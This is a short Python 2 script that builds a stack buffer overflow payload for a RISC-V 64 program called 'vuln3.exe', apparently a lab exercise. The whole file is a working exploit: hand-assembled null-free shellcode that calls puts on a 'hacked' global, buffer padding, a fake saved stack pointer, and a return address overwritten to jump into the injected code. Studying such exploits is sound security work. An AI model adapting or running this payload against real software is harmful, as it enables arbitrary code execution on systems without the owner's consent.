#!/usr/bin/python

import os
import struct
#this payload is for vuln3.exe
#riscv64-unknown-elf-as -o shellcode.o shellcode.s
#riscv64-unknown-elf-ld -o shellcode shellcode.o
#riscv64-unknown-elf-objdump -d shellcode > shellcode.dump
# Machine code of each instruction can be found in shellcode3.dump file

# This shellcode is supposed to print global hacked variable 
# shellcode crafted so that it does not contain any null bytes
payload = "A"*3

payload += "\xb7\x07\x11\x11"#lui a5,0x11110
payload += "\x37\x08\x10\x11"#lui a6,0x11100
payload += "\x37\x07\x11\x11"#lui a4,0x11110
payload += "\x33\x07\x07\x41"#sub a4,a4,a6
payload += "\xb3\x87\x07\x41"#sub a5,a5,a6
payload += "\x13\x85\x07\x6f"#addi a0,a5,-1328 hacked value in a0 ( print hackedd in gdb)
payload += "\x67\x06\x07\x4c"#jalr a2,a4,-1020 address of puts in a2( print puts in gdb)

payload +=  "A"*76	#fill buffer

payload += "BBBB"	#old sp

#return to a injected code address ( address of buffer+3byte for alignment )
payload +="\x8c\xfb\xff\xff\x3f\x00\x00\x00"

#payload="echo \"%s\"" % payload
print "\"%s\""%payload
#os.system(payload)
